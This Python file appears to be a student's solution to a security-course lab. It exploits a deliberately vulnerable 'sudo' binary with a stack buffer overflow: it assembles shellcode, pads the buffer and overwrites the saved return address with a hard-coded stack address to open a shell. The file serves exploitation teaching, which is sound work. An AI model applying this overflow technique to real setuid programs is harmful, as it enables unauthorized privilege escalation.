import os
import sys
from infosec.core import assemble


def run_shell(path_to_sudo: str):
    """
    Exploit the vulnerable sudo program to open an interactive shell.

    The assembly code of the shellcode should be saved in `shellcode.asm`, use
    the `assemble` module to translate the assembly to bytes.

    WARNINGS:
    1. As before, use `path_to_sudo` and don't hard-code the path.
    2. If you reference any external file, it must be *relative* to the current
       directory! For example './shellcode.asm' is OK, but
       '/home/user/3/q2/shellcode.asm' is bad because it's an absolute path!

    Tips:
    1. For help with the `assemble` module, run the following command (in the
       command line).
           ipython3 -c 'from infosec.core import assemble; help(assemble)'
    2. As before, prefer using `os.execl` over `os.system`.

    :param path_to_sudo: The path to the vulnerable sudo program.
    """
    # Your code goes here.
    #raise NotImplementedError()
    
    #get the binary of our assemble
    let_them_crash = bytearray(assemble.assemble_file("shellcode.asm"))
    
      
    #in index 77-10 , to 80-10 it's the eip we want to overwrite
    #with our buffer address    
    #0xbfffdfc9 is the address of the beginning of the buffer? 
   
  
    #print(let_them_crash[5:])
    
    #tell us how much need to pad our binary
    padding = len(let_them_crash)
    #some cool pading feature 
    lst = ['N', 'a', 't', 'a', 'n', 'e', 'l',' ', 'S', 'h', 'a'
            ,'l', 'm', 'a', 'y', 'e', 'v']
            
    #print(padding)
    
    for i in range(67-padding):#we need the array to be 67 length
        #so pad it, I pad it is some cool way :)
        if i >= len(lst):
            let_them_crash.append(33)
        else:
            let_them_crash.append(ord(lst[i]))
    
    #now at the end append our address (reverse it since big and little
    #endian issues)
    let_them_crash.append(0xc9)
    let_them_crash.append(0xdf)
    let_them_crash.append(0xff)
    let_them_crash.append(0xbf)
    
    #to os.execl need to send bytes
    let_them_crash = bytes(let_them_crash)
        
    #uncomment the next line if you want to see my cool pading :)
    #print(let_them_crash)

    
    os.execl(path_to_sudo, path_to_sudo, let_them_crash, "ls")


def main(argv):
    # WARNING: Avoid changing this function.
    if not len(argv) == 1:
        print('Usage: %s' % argv[0])
        sys.exit(1)

    run_shell(path_to_sudo='./sudo')


if __name__ == '__main__':
    main(sys.argv)
